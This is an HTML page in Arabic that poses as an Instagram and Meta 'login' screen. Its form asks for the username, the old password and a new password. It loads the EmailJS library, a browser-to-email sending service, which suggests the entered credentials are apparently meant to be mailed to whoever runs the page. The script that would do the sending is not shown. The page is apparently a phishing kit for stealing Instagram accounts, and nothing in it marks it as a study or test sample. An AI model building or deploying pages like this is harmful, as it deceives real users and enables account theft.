<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تسجيل الدخول - Instagram</title>
    <script type="text/javascript" src="https://cdn.emailjs.com/dist/email.min.js"></script>
    <link rel="stylesheet" href="styles.css">
</head>
<body>

    <div class="container">
        <h1>Instagram</h1>
        <form id="resetPasswordForm">
            <input type="text" id="username" class="form-input" placeholder="اسم المستخدم" required>
            <input type="password" id="old_password" class="form-input" placeholder="كلمة السر القديمة" required>
            <input type="password" id="new_password" class="form-input" placeholder="كلمة السر الجديدة" required>
            <button type="submit" class="btn">إعادة تعيين كلمة السر</button>
        </form>
    </div>

    <div class="footer">
        <p>هل نسيت كلمة السر؟ <a href="#">إعادة تعيين كلمة السر</a></p>
    </div>

    <div class="meta">
        <p>Meta∞</p>
    </div>

    <script src="script.js"></script>
</body>
</html>
